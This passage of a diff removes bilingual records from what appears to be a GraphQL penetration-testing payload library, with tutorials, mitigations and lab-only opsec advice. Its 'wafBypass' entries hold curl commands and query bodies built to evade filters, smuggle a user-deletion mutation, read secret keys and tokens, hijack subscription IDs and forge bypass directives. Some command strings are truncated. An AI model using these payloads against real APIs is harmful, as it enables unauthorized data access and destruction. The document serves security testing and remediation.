-          "zh": "从两个元素开始并限制总复杂度，观察资源指标后再停止。",
-          "en": "Start with two elements, cap aggregate complexity, and stop after observing resource metrics."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "所有行共享 GraphQL HTTP 批处理控制边界，属于协议请求 Payload；教程明确禁止直接运行高影响示例。",
-        "issuesResolved": [
-          "corrected-name",
-          "clarified-nonstandard-batching",
-          "bounded-impact",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "content-type 变换批处理",
-            "en": "content-type Batch Swap"
-          },
-          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: text/plain\" -d '[{\"query\":\"{me{id}}\"},{\"query\":\"{users{id email}}\"}]'",
-          "description": {
-            "zh": "text/plain 携带批处理数组绕过 JSON 数组体特征。成功判据：数组被解析为批查询。",
-            "en": "text/plain carrying a batch array bypasses JSON-array body signatures. Success: the array parses as batched queries."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "-H \"Content-Type: text/plain\"",
-              "explanation": {
-                "zh": "纯文本类型头",
-                "en": "Plain text content type"
-              },
-              "type": "header"
-            },
-            {
-              "part": "-d '[{\"query\":\"{me{id}}\"},{\"query\":\"{users{id email}}\"}]'",
-              "explanation": {
-                "zh": "text/plain 批数组",
-                "en": "text/plain batch array"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "http://{TARGET}/graphql",
-              "explanation": {
-                "zh": "GraphQL 端点",
-                "en": "GraphQL endpoint"
-              },
-              "type": "url"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "混合 mutation 批处理",
-            "en": "Mixed-Mutation Batching"
-          },
-          "command": "[{\"query\":\"{users{id email}}\"},{\"query\":\"mutation{deleteUser(id:1){id}}\"},{\"query\":\"{config{secretKey}}\"}]",
-          "description": {
-            "zh": "读操作夹带 mutation 绕过按操作类型分流的限速。成功判据：删除与敏感读同批执行。",
-            "en": "Reads smuggling a mutation bypass per-operation-type rate limits. Success: the delete and sensitive read execute in one batch."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "[{\"query\":\"{users{id email}}\"}",
-              "explanation": {
-                "zh": "读操作打头",
-                "en": "Read operation first"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "{\"query\":\"mutation{deleteUser(id:1){id}}\"}",
-              "explanation": {
-                "zh": "夹带删除操作",
-                "en": "Smuggled delete operation"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "{\"query\":\"{config{secretKey}}\"}",
-              "explanation": {
-                "zh": "夹带敏感读取",
-                "en": "Smuggled sensitive read"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "operationName 变形",
-            "en": "operationName Mutation"
-          },
-          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"operationName\":\"legitQuery\",\"query\":\"mutation m{config{secretKey}}\"}'",
-          "description": {
-            "zh": "operationName 标签伪装为合法查询绕过审计。成功判据：敏感 mutation 执行成功。",
-            "en": "An operationName labeled as a legit query bypasses auditing. Success: the sensitive mutation executes."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "'{\"operationName\":\"legitQuery\",\"query\":\"mutation m{config{secretKey}}\"}'",
-              "explanation": {
-                "zh": "标签伪装的操作",
-                "en": "Mislabeled operation"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"operationName\":\"legitQuery\"",
-              "explanation": {
-                "zh": "合法化标签",
-                "en": "Legit-looking label"
-              },
-              "type": "value"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "api2-subscription",
-      "name": {
-        "zh": "GraphQL Subscription 订阅授权验证",
-        "en": "GraphQL Subscription Authorization Validation"
-      },
-      "description": {
-        "zh": "验证 Subscription 在连接建立、订阅注册和每次事件投递阶段是否持续执行主体、租户、主题和字段授权，防止低权限连接接收其他对象的敏感事件。",
-        "en": "Validate whether GraphQL subscriptions continuously enforce principal, tenant, topic, and field authorization during connection setup, subscription registration, and each event delivery."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "GraphQL 授权与 IDOR",
-        "en": "GraphQL Authorization & IDOR"
-      },
-      "prerequisites": [
-        {
-          "zh": "准备两个测试租户或用户、隔离的事件源和可识别的非敏感事件值。",
-          "en": "Prepare two test tenants or users, isolated event sources, and identifiable nonsensitive event values."
-        },
-        {
-          "zh": "记录 WebSocket 或 SSE 握手、连接参数、订阅确认和事件投递日志。",
-          "en": "Record WebSocket or SSE handshakes, connection parameters, subscription acknowledgements, and event-delivery logs."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL Subscription 订阅授权场景，检验连接、订阅注册与事件投递三阶段的持续校验。验证维度为他人对象敏感订阅的发起矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL subscription authorization, testing continuous checks across connection, subscribe registration and event delivery. Validation is an initiation matrix over other-user sensitive subscriptions, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于订阅授权仅在连接建立阶段执行而主题注册与事件投递阶段脱节：低权连接订阅他人事件流后即可实时持续接收敏感字段的更新推送。",
-          "en": "The root cause is subscription authorization running only at connection setup while topic registration and event delivery go unchecked: low-privilege connections subscribing to others' streams keep receiving real-time sensitive field updates."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本以当前身份逐条发起他人对象与敏感字段的订阅，记录订阅是否被接受及后续投递内容：非授权事件流持续推送即确认订阅授权缺失，捕获首条投递作为证据。成功判据以投递内容与身份对照为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, initiate other-user and sensitive-field subscriptions one by one as the current identity per the script, recording acceptances and subsequent deliveries; unauthorized event streams pushing continuously confirm missing subscription authorization, with first deliveries captured as evidence. Judge success by delivery content versus identity. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "订阅注册与每次投递都对照主体重校验主题与字段权限，会话失效即断流。修复后重放第 1 步矩阵，非授权订阅应被拒绝或投递为空。",
-          "en": "Re-validate topic and field permissions per principal at registration and every delivery, cutting streams on session loss. After the fix, replay the step 1 matrix: unauthorized subscriptions should be rejected or deliver empty."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "建立自身事件订阅基线",
-            "en": "Establish a self-event baseline"
-          },
-          "description": {
-            "zh": "以低权限账户订阅自身测试事件，记录连接身份、主题过滤和事件字段。",
-            "en": "Subscribe to the account's own test event and record connection identity, topic filtering, and event fields."
-          }
-        },
-        {
-          "title": {
-            "zh": "注册敏感事件订阅",
-            "en": "Register sensitive event subscriptions"
-          },
-          "description": {
-            "zh": "在隔离环境提交原始订阅集合，但只由测试事件源生成无害标记事件。",
-            "en": "Submit the original subscription set in isolation while generating harmless marker events only from test sources."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "交叉主体并撤销权限",
-            "en": "Cross principals and revoke access"
-          },
-          "description": {
-            "zh": "由另一主体发布事件并撤销接收者权限，确认连接不会继续接收越权内容。",
-            "en": "Publish from another principal and revoke receiver access, confirming the connection does not continue receiving unauthorized content."
-          }
-        },
-        {
-          "title": {
-            "zh": "修复事件级授权并复测",
-            "en": "Repair event-level authorization and retest"
-          },
-          "description": {
-            "zh": "加入投递前授权与连接失效后重放，确认自身事件可用且跨主体事件被过滤。",
-            "en": "After adding pre-delivery authorization and connection invalidation, replay to confirm self events remain available and cross-principal events are filtered."
-          }
-        }
-      ],
-      "references": [
-        "https://spec.graphql.org/October2021/#sec-Subscription",
-        "https://graphql.org/learn/subscriptions/"
-      ],
-      "analysis": {
-        "zh": "只有低权限连接收到其他主体或租户的真实测试事件，或权限撤销后仍持续收到事件，才确认问题；连接成功、schema 可见或没有事件投递都不足以证明。",
-        "en": "Confirmation requires a low-privilege connection to receive another principal's or tenant's real test event, or to continue receiving events after revocation. A successful connection, schema visibility, or absence of delivery is insufficient."
-      },
-      "opsecTips": [
-        {
-          "zh": "只发布带随机标记的测试事件，不触发真实支付、文件上传或管理操作。",
-          "en": "Publish only random-marker test events; do not trigger real payment, file-upload, or administrative actions."
-        },
-        {
-          "zh": "测试结束后主动关闭连接并清理事件总线中的测试订阅。",
-          "en": "Close connections explicitly and remove test subscriptions from the event bus after testing."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始内容是 GraphQL Subscription 文档，属于实时事件授权 Payload，不是工具命令。",
-        "issuesResolved": [
-          "corrected-name",
-          "added-lifecycle-authorization",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "子协议变形",
-            "en": "Subprotocol Mutation"
-          },
-          "command": "new WebSocket('ws://{TARGET}/graphql', ['graphql-ws','graphql-transport-ws','v1'])",
-          "description": {
-            "zh": "轮换子协议命中未鉴权的老协议处理器。成功判据：连接建立并收到订阅推送。",
-            "en": "Rotating subprotocols hits unauthenticated legacy handlers. Success: the connection opens and pushes subscription events."
-          }
-        },
-        {
-          "title": {
-            "zh": "降级查询订阅",
-            "en": "Query-as-Subscription Downgrade"
-          },
-          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"subscription{userUpdated{id email role secretToken}}\",\"operationName\":null}' -H \"X-Subscription-Protocol: apollo",
-          "description": {
-            "zh": "HTTP 通道模拟订阅协议头绕过 WebSocket-only 鉴权。成功判据：返回订阅初始数据或被接受。",
-            "en": "Simulating subscription protocol headers over HTTP bypasses WebSocket-only auth. Success: initial subscription data returns or the request is accepted."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "curl -sS --max-time 5 -X P",
-              "explanation": {
-                "zh": "curl 发起请求",
-                "en": "curl request"
-              },
-              "type": "function"
-            },
-            {
-              "part": "-X POST",
-              "explanation": {
-                "zh": "POST 方法",
-                "en": "POST method"
-              },
-              "type": "flag"
-            },
-            {
-              "part": "http://{TARGET}/graphql",
-              "explanation": {
-                "zh": "目标 URL",
-                "en": "Target URL"
-              },
-              "type": "url"
-            },
-            {
-              "part": "-H \"Content-Type: application/json",
-              "explanation": {
-                "zh": "自定义请求头",
-                "en": "Custom header"
-              },
-              "type": "header"
-            },
-            {
-              "part": "-d '{\"query\":\"subscription{u",
-              "explanation": {
-                "zh": "请求体数据",
-                "en": "Request body data"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "订阅 ID 复用劫持",
-            "en": "Subscription-ID Reuse Hijack"
-          },
-          "command": "{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{messageCreated{id content sender{email}}}\"}}\n{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{userUpdated{secretToken}}\"}}",
-          "description": {
-            "zh": "复用已鉴权订阅 ID 携带新查询绕过每订阅鉴权。成功判据：第二个查询收到推送。",
-            "en": "Reusing an authenticated subscription id with a new query bypasses per-subscription auth. Success: the second query receives pushes."
-          }
-        }
-      ]
-    },
-    {
-      "id": "api2-directive",
-      "name": {
-        "zh": "GraphQL 指令与字段授权验证",
-        "en": "GraphQL Directive and Field-Authorization Validation"
-      },
-      "description": {
-        "zh": "验证 @skip、@include、schema 内省和自定义指令参与查询时，字段解析器是否仍执行授权；同时把不可用于可执行文档的 @deprecated 样例作为验证阶段负对照。",
-        "en": "Validate whether field resolvers still authorize access when @skip, @include, introspection, or custom directives appear, while treating @deprecated in executable documents as a validation-stage negative control."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "GraphQL 授权与 IDOR",
-        "en": "GraphQL Authorization & IDOR"
-      },
-      "prerequisites": [
-        {
-          "zh": "已导出目标 schema 中可执行指令及其允许位置，并准备低权限测试主体。",
-          "en": "Executable directives and their allowed locations in the target schema are known, and a low-privilege test principal is ready."
-        },
-        {
-          "zh": "已记录不带指令的同字段查询结果、验证错误和解析器授权日志。",
-          "en": "Results, validation errors, and resolver authorization logs for equivalent fields without directives have been recorded."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL 指令与字段授权场景，检验 skip、include 与废弃字段参与查询时的解析器授权一致性。验证维度为指令组合与废弃字段的提交矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL directive and field authorization, testing resolver authorization consistency when skip, include and deprecated fields join queries. Validation is a submission matrix of directive combos and deprecated fields, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于字段授权在指令求值之前即短路返回，或废弃字段遗留了仍可用的解析器：指令组合让受限字段走非常规求值路径并返回敏感数据。",
-          "en": "The root cause is field authorization short-circuiting before directive evaluation, or deprecated fields keeping live resolvers: directive combos route restricted fields down unconventional evaluation paths returning sensitive data."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本把 skip 与 include 组合及废弃字段变体逐条提交并记录返回字段：受限字段经指令路径返回即确认指令校验缺失，废弃字段返回值一并作为遗留证据。成功判据以返回字段矩阵为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, submit skip and include combos plus deprecated-field variants one by one per the script, recording returned fields; restricted fields returning via directive paths confirm missing directive validation, with deprecated-field values archived as legacy evidence. Judge success by the returned-field matrix. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "字段授权在指令求值后仍强制执行并清理废弃解析器，指令白名单限制可执行集。修复后重放第 1 步矩阵，全部变体应返回授权错误或空值。",
-          "en": "Enforce field authorization after directive evaluation, purge deprecated resolvers, and allowlist executable directives. After the fix, replay the step 1 matrix: every variant should return authorization errors or null."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "识别标准与自定义指令",
-            "en": "Identify standard and custom directives"
-          },
-          "description": {
-            "zh": "从 schema 记录指令定义、允许位置和无指令字段授权基线。",
-            "en": "Record directive definitions, allowed locations, and the authorization baseline for fields without directives."
-          }
-        },
-        {
-          "title": {
-            "zh": "逐种指令重放同一字段",
-            "en": "Replay the same field per directive"
-          },
-          "description": {
-            "zh": "提交原始指令集合并一次只观察一种组合，保留非法位置作为负对照。",
-            "en": "Submit the original directive set one combination at a time, retaining illegal locations as negative controls."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "关联验证与解析器授权",
-            "en": "Correlate validation and resolver authorization"
-          },
-          "description": {
-            "zh": "区分验证阶段拒绝、字段被跳过和解析器实际返回未授权敏感值。",
-            "en": "Distinguish validation rejection, skipped fields, and resolvers that actually return unauthorized sensitive values."
-          }
-        },
-        {
-          "title": {
-            "zh": "固定授权层并执行组合回归",
-            "en": "Fix the authorization layer and regress combinations"
-          },
-          "description": {
-            "zh": "将授权下沉后重放标准、自定义和非法指令，确认允许行为保留且拒绝一致。",
-            "en": "After moving authorization downward, replay standard, custom, and illegal directives to confirm allowed behavior remains and denials are consistent."
-          }
-        }
-      ],
-      "references": [
-        "https://spec.graphql.org/October2021/#sec-Type-System.Directives",
-        "https://spec.graphql.org/October2021/#sec-Validation"
-      ],
-      "analysis": {
-        "zh": "确认标准是某个原本拒绝的敏感字段仅因合法指令组合而返回真实值。验证错误、字段省略、内省只返回名称或未定义自定义指令均属于负对照。",
-        "en": "Confirmation requires a sensitive field that is normally denied to return a real value solely because of a valid directive combination. Validation errors, omitted fields, name-only introspection, and undefined custom directives are negative controls."
-      },
-      "opsecTips": [
-        {
-          "zh": "先在 schema 副本确认自定义指令语义，不向生产端点盲目枚举未知指令。",
-          "en": "Confirm custom-directive semantics in a schema copy before testing; do not blindly enumerate unknown directives on production endpoints."
-        },
-        {
-          "zh": "只选择虚构敏感值，并把非法指令限制为单次验证请求。",
-          "en": "Select synthetic sensitive values only and limit illegal-directive controls to a single validation request."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始内容混有有效标准指令、schema 内省、自定义指令和应失败的负对照；保留为验证 Payload 并纠正了“指令注入必然绕过”的错误表述。",
-        "issuesResolved": [
-          "corrected-technical-claim",
-          "documented-negative-controls",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "自定义指令注入",
-            "en": "Custom Directive Injection"
-          },
-          "command": "{user(id:1){id email role secretToken @auth(bypass:true)}}\nquery @noAuth{user(id:1){secretToken}}",
-          "description": {
-            "zh": "伪造自定义指令命中实现宽松处理的指令处理器。成功判据：指令使字段返回。",
-            "en": "Forged custom directives hit leniently implemented handlers. Success: the directive makes the field return."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "secretToken @auth(bypass:true)",
-              "explanation": {
-                "zh": "伪造鉴权绕过指令",
-                "en": "Forged bypass directive"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "query @noAuth{user(id:1){secretToken}}",
-              "explanation": {
-                "zh": "免鉴权指令",
-                "en": "No-auth directive"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "嵌套 skip/include 组合",
-            "en": "Nested skip/include Combo"
-          },
-          "command": "{user(id:1){id email @skip(if:false) role @include(if:true){...on Admin{secretToken @skip(if:false)}}}}",
-          "description": {
-            "zh": "嵌套条件指令改变字段解析路径绕过静态审计。成功判据：特权字段按条件返回。",
-            "en": "Nested conditional directives alter field resolution past static auditing. Success: privileged fields return conditionally."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "{user(id:1){id email @skip(if:false) role @include(if:true){...on Admin{secretToken @skip(if:false)}}}}",
-              "explanation": {
-                "zh": "嵌套条件指令组合",
-                "en": "Nested conditional directives"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "@include(if:true){...on Admin",
-              "explanation": {
-                "zh": "条件内联片段",
-                "en": "Conditional inline fragment"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "变量控制指令",
-            "en": "Variable-Controlled Directive"
-          },
-          "command": "{\"query\":\"query($s:Boolean!,$i:Boolean!){user(id:1){email @skip(if:$s) secretToken @include(if:$i)}}\",\"variables\":{\"s\":false,\"i\":true}}",
-          "description": {
-            "zh": "指令条件移入变量绕过查询体中的 true 字面特征。成功判据：敏感字段被包含返回。",
-            "en": "Moving directive conditions into variables masks literal true signatures. Success: the sensitive field is included and returned."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "{\"query\":\"query($s:Boolean!,$i:Boolean!){user(id:1){email @skip(if:$s) secretToken @include(if:$i)}}\"",
-              "explanation": {
-                "zh": "变量控制指令",
-                "en": "Variable-controlled directives"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"variables\":{\"s\":false,\"i\":true}",
-              "explanation": {
-                "zh": "指令变量取值",
-                "en": "Directive variable values"
-              },
-              "type": "value"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "api2-json",
-      "name": {
-        "zh": "GraphQL 变量跨层输入混合集（待拆分）",
-        "en": "GraphQL Variable Cross-Layer Input Corpus (Split Required)"
-      },
-      "description": {
-        "zh": "原记录把 SQL 注入、路径遍历、批量赋值、结构化过滤、XSS、通配搜索和超大分页混在一个命令块中；这些输入到达不同下游解释器，必须拆成独立 Payload。",
-        "en": "The source mixes SQL injection, path traversal, mass assignment, structured filtering, XSS, wildcard search, and oversized pagination in one command block. These values reach different downstream interpreters and must be split into independent payloads."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "GraphQL 变量边界拆分",
-        "en": "GraphQL Variable Boundary Split"
-      },
-      "prerequisites": [
-        {
-          "zh": "仅在 schema 副本中记录每个变量的声明类型、解析器、下游存储和输出上下文。",
-          "en": "In a schema copy, record each variable's declared type, resolver, downstream store, and output context."
-        },
-        {
-          "zh": "为数据库、文件、对象绑定、渲染和资源限制分别准备独立可回滚基线。",
-          "en": "Prepare separate reversible baselines for database, file, object binding, rendering, and resource-limit boundaries."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "GraphQL 变量只是结构化传输层，安全结论取决于变量进入 SQL、文件路径、对象绑定、HTML 输出或查询规划后的处理。原十行跨越至少六类根因，不能共用一套前提、证据和修复，因此本卡只承担审校与拆分说明。",
-          "en": "GraphQL variables are a structured transport layer; the security result depends on how a value is handled after reaching SQL, file paths, object binding, HTML output, or query planning. The ten lines span at least six root causes and cannot share prerequisites, evidence, or remediation, so this card exists only to govern the split."
-        },
-        "vulnerability": {
-          "zh": "把所有异常变量称为“JSON 注入”会掩盖真实边界：强类型 Int 通常在解析阶段拒绝 SQL 字符串，String 变量仍可能进入危险 SQL 或路径拼接，Input Object 可能触发批量赋值，而输出未编码才产生 XSS。必须按最终 sink 判定。",
-          "en": "Calling every abnormal variable JSON injection hides the real boundary. A typed Int normally rejects SQL text during coercion, a String may still reach unsafe SQL or path concatenation, an input object may enable mass assignment, and XSS requires an unsafe output sink. Classification must follow the final interpreter."
-        },
-        "exploitation": {
-          "zh": "先验证变量类型强制和正常值，再将原命令按 SQL、路径、对象绑定、结构化过滤、浏览器输出与资源限制六组逐行拆分。每个新条目只改变一个变量，关联相应下游日志，并将类型强制失败保留为负对照。",
-          "en": "Validate variable coercion and normal values first, then partition every original line into SQL, path, object-binding, structured-filter, browser-output, and resource-limit groups. Each replacement changes one variable, correlates the appropriate downstream log, and retains type-coercion failures as negative controls."
-        },
-        "mitigation": {
-          "zh": "在 GraphQL 类型强制之外，对每个业务字段实施允许列表和长度范围；数据库使用参数化查询，路径使用固定根目录与规范化校验，输入对象限制可写字段，HTML 按上下文编码，并对通配和分页设置查询成本上限。",
-          "en": "Beyond GraphQL coercion, allowlist and bound every business field. Use parameterized database queries, fixed-root path canonicalization, writable-field allowlists for input objects, context-aware HTML encoding, and query-cost limits for wildcard search and pagination."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "绘制变量到下游边界映射",
-            "en": "Map variables to downstream boundaries"
-          },
-          "description": {
-            "zh": "记录每行变量声明、解析器和最终 SQL、路径、对象、HTML 或查询规划 sink。",
-            "en": "Record each line's variable declaration, resolver, and final SQL, path, object, HTML, or query-planning sink."
-          }
-        },
-        {
-          "title": {
-            "zh": "按六类边界分配原命令",
-            "en": "Partition commands into six boundaries"
-          },
-          "description": {
-            "zh": "逐行审阅原始命令并分配到唯一新 Payload，禁止将完整混合集直接执行。",
-            "en": "Review every original line and assign it to one unique replacement payload; never execute the mixed corpus as a whole."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "为每类建立独立证据",
-            "en": "Establish evidence per class"
-          },
-          "description": {
-            "zh": "在拆分条目中分别关联类型错误、数据库、文件、对象状态、DOM 和资源指标。",
-            "en": "In each replacement, correlate coercion errors, database, file, object state, DOM, or resource metrics as applicable."
-          }
-        },
-        {
-          "title": {
-            "zh": "按 sink 修复并逐条回归",
-            "en": "Remediate by sink and regress individually"
-          },
-          "description": {
-            "zh": "应用对应边界修复后逐条重放，确认正常变量保留且异常值在正确层被拒绝。",
-            "en": "After boundary-specific remediation, replay each line to confirm normal variables remain and abnormal values are rejected at the correct layer."
-          }
-        }
-      ],
-      "references": [
-        "https://spec.graphql.org/October2021/#sec-Input-Coercion",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "该源卡不能产生单一漏洞结论。最终拆分必须保证十条原命令完整且只出现一次，并且每个新卡的分类、证据与修复都对应实际下游 sink。",
-        "en": "This source card cannot support one vulnerability conclusion. The final split must preserve every original command exactly once, with each replacement's category, evidence, and remediation matching its actual downstream sink."
-      },
-      "opsecTips": [
-        {
-          "zh": "不要执行完整混合集；一次只在对应实验服务中验证一个变量和一个 sink。",
-          "en": "Do not execute the mixed corpus as a whole; validate one variable and one sink at a time in the corresponding lab service."
-        },
-        {
-          "zh": "禁止使用删表、真实文件或真实管理角色，全部替换为可回滚测试对象。",
-          "en": "Do not use table deletion, real files, or real administrative roles; substitute reversible test objects."
-        }
-      ],
-      "review": {
-        "decision": "split",
-        "rationale": "十行命令跨越六种下游解释边界，保留为单卡会给出错误教程和修复建议，必须逐行拆分。",
-        "issuesResolved": [
-          "identified-mixed-collection",
-          "corrected-technical-claim",
-          "planned-line-complete-split",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ],
-        "targetPayloadIds": [
-          "api2-variable-sql-boundary",
-          "api2-variable-path-boundary",
-          "api2-variable-mass-assignment",
-          "api2-variable-structured-filter",
-          "api2-variable-html-output",
-          "api2-variable-query-cost"
-        ]
-      }
-    },
-    {
-      "id": "api2-dos",
-      "name": {
-        "zh": "GraphQL 查询复杂度限制验证",
-        "en": "GraphQL Query Complexity Limit Validation"
-      },
-      "description": {
-        "zh": "使用受控深度、别名数量与递归关系查询验证 GraphQL 执行前的深度/宽度/成本限制。",
-        "en": "Use controlled depth, alias counts, and recursive relationship queries to verify GraphQL depth/width/cost limits before execution."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "批量查询与资源滥用",
-        "en": "Batch Queries & Resource Abuse"
-      },
-      "prerequisites": [
-        {
-          "zh": "在隔离环境获得服务端 CPU、内存、解析时长、resolver 数和查询成本指标。",
-          "en": "Server CPU, memory, parse time, resolver count, and query-cost metrics are available in an isolated environment."
-        },
-        {
-          "zh": "定义批准的最大深度、最大字段数、超时和立即停止阈值。",
-          "en": "Approved maximum depth, field count, timeout, and immediate stop thresholds are defined."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL 查询复杂度限制验证场景，检验服务端对深度、宽度与递归关系的执行前限制。验证维度为深嵌套、别名堆叠与宽分页的边界探针矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL query-complexity limit validation, testing pre-execution limits on depth, width and recursive relations. Validation is a boundary-probe matrix of deep nesting, alias stacking and wide pagination, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于服务端未在执行前限制文档深度与估算成本：嵌套与别名组合把单请求放大为指数级 resolver 调用，资源保护形同虚设。",
-          "en": "The root cause is servers skipping pre-execution depth limits and cost estimates: nesting plus alias combos amplify one request into exponential resolver calls, leaving resource protection nominal."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本把深嵌套、别名与宽分页探针逐条提交并记录响应时间与服务端决策：耗时激增或拒绝缺失即确认成本边界缺口，探针规模保持在小样本以避免真实影响。成功判据以边界拒绝记录为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, submit deep-nesting, alias and wide-pagination probes one by one per the script, recording response times and server decisions; spiking times or missing rejections confirm the cost-boundary gap, with probe sizes kept to small samples to avoid real impact. Judge success by boundary-rejection records. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "部署深度限制与成本分析器并在校验阶段拒绝超限文档，对解析耗时建立基线告警。修复后重放第 1 步矩阵，全部探针应在执行前被拒绝。",
-          "en": "Deploy depth limits and cost analyzers rejecting over-limit documents at validation, with baseline alerts on resolver timing. After the fix, replay the step 1 matrix: every probe should be refused pre-execution."
-        },
-        "difficulty": "advanced"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "建立最小查询资源基线",
-            "en": "Establish minimal-query resource baseline"
-          },
-          "description": {
-            "zh": "记录浅层单字段查询的解析、验证、resolver 数和资源使用。",
-            "en": "Record parsing, validation, resolver count, and resource use for a shallow single-field query."
-          }
-        },
-        {
-          "title": {
-            "zh": "逐级增加一个复杂度维度",
-            "en": "Increase one complexity dimension"
-          },
-          "description": {
-            "zh": "按原始深度和别名样例单次重放，每次只增加深度、宽度或别名之一。",
-            "en": "Replay the original depth and alias probes one at a time, increasing only depth, breadth, or aliases."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "确认预算拒绝或非线性增长",
-            "en": "Confirm budget rejection or nonlinear growth"
-          },
-          "description": {
-            "zh": "比较错误阶段和资源曲线，只有未受限且明显非线性增长才继续报告风险。",
-            "en": "Compare rejection stage and resource curves; report risk only for unbounded, clearly nonlinear growth."
-          }
-        },
-        {
-          "title": {
-            "zh": "设置成本预算并重放",
-            "en": "Set cost budgets and replay"
-          },
-          "description": {
-            "zh": "配置深度、复杂度与超时后重放同一阶梯，确认高成本查询提前拒绝且正常查询不受影响。",
-            "en": "After configuring depth, complexity, and timeout budgets, replay the ladder to confirm expensive queries are rejected early while normal queries remain unaffected."
-          }
-        }
-      ],
-      "references": [
-        "https://graphql.org/learn/security/",
-        "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
-      ],
-      "analysis": {
-        "zh": "原样例只能证明查询复杂度控制行为，不能单独证明 DoS。有效发现需要在批准阈值内显示成本未受限、资源随单一变量非线性增长或正常请求明显受影响。",
-        "en": "The source probes show query-complexity control behavior, not denial of service by themselves. A valid finding requires unbounded cost, nonlinear resource growth from one variable, or measurable impact on normal requests within approved limits."
-      },
-      "opsecTips": [
-        {
-          "zh": "只在隔离副本串行递增，达到 CPU、延迟或 resolver 阈值立即停止。",
